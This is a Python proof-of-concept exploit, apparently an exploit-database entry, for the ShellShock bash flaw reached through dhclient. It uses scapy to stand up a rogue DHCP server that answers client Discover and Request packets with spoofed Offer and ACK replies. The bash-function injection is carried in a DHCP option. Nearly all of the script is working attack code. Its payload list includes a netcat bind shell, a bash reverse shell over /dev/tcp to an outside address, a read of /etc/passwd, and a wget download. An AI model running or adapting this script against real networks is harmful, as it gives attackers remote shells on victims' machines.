#!/usr/bin/python
# Exploit Title: ShellShock dhclient Bash Environment Variable Command Injection PoC
# Date: 2014-09-29 
# Author: @fdiskyou
# e-mail: rui at deniable.org
# Version: 4.1
# Tested on: Debian, Ubuntu, Kali
# CVE: CVE-2014-6277, CVE-2014-6278, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187
from scapy.all import *

conf.checkIPaddr = False
fam,hw = get_if_raw_hwaddr(conf.iface)
victim_assign_ip = "10.0.1.100"
server_ip = "10.0.1.2"
gateway_ip = "10.0.1.2"
subnet_mask = "255.255.255.0"
dns_ip = "8.8.8.8"
spoofed_mac = "00:50:56:c0:00:01"
payload =   "() { ignored;}; echo 'moo'"
payload_2 = "() { ignored;}; /bin/nc -e /bin/bash localhost 7777"
payload_3 = "() { ignored;}; /bin/bash -i >& /dev/tcp/10.0.1.1/4444 0>&1 &"
payload_4 = "() { ignored;}; /bin/cat /etc/passwd"
payload_5 = "() { ignored;}; /usr/bin/wget http://google.com"
rce = payload_5
 
def toMAC(strMac):
    cmList = strMac.split(":")
    hCMList = []
    for iter1 in cmList:
        hCMList.append(int(iter1, 16))
    hMAC = struct.pack('!B', hCMList[0]) + struct.pack('!B', hCMList[1]) + struct.pack('!B', hCMList[2]) + struct.pack('!B', hCMList[3]) + struct.pack('!B', hCMList[4]) + struct.pack('!B', hCMList[5])
    return hMAC
 
def detect_dhcp(pkt):
#       print 'Process ', ls(pkt)
        if DHCP in pkt:
                # if DHCP Discover then DHCP Offer
                if pkt[DHCP].options[0][1]==1:
                        clientMAC = pkt[Ether].src
                        print "DHCP Discover packet detected from " + clientMAC
 
                        sendp(
                                Ether(src=spoofed_mac,dst="ff:ff:ff:ff:ff:ff")/
                                IP(src=server_ip,dst="255.255.255.255")/
                                UDP(sport=67,dport=68)/
                                BOOTP(
                                        op=2,
                                        yiaddr=victim_assign_ip,
                                        siaddr=server_ip,
                                        giaddr=gateway_ip,
                                        chaddr=toMAC(clientMAC),
                                        xid=pkt[BOOTP].xid,
                                        sname=server_ip
                                )/
                                DHCP(options=[('message-type','offer')])/
                                DHCP(options=[('subnet_mask',subnet_mask)])/
                                DHCP(options=[('name_server',dns_ip)])/
                                DHCP(options=[('lease_time',43200)])/
                                DHCP(options=[('router',gateway_ip)])/
                                DHCP(options=[('dump_path',rce)])/
                                DHCP(options=[('server_id',server_ip),('end')]), iface="vmnet1"
                        )
                        print "DHCP Offer packet sent"
 
                # if DHCP Request than DHCP ACK
                if pkt[DHCP] and pkt[DHCP].options[0][1] == 3:
                        clientMAC = pkt[Ether].src
                        print "DHCP Request packet detected from " + clientMAC
 
                        sendp(
                                Ether(src=spoofed_mac,dst="ff:ff:ff:ff:ff:ff")/
                                IP(src=server_ip,dst="255.255.255.255")/
                                UDP(sport=67,dport=68)/
                                BOOTP(
                                        op=2,
                                        yiaddr=victim_assign_ip,
                                        siaddr=server_ip,
                                        giaddr=gateway_ip,
                                        chaddr=toMAC(clientMAC),
                                        xid=pkt[BOOTP].xid
                                )/
                                DHCP(options=[('message-type','ack')])/
                                DHCP(options=[('subnet_mask',subnet_mask)])/
                                DHCP(options=[('lease_time',43200)])/
                                DHCP(options=[('router',gateway_ip)])/
                                DHCP(options=[('name_server',dns_ip)])/
                                DHCP(options=[('dump_path',rce)])/
                                DHCP(options=[('server_id',server_ip),('end')]), iface="vmnet1"
                        )
                        print "DHCP Ack packet sent"
 
def main():
        #sniff DHCP requests
        sniff(filter="udp and (port 67 or 68)", prn=detect_dhcp, iface="vmnet1")
 
if __name__ == '__main__':
        sys.exit(main())
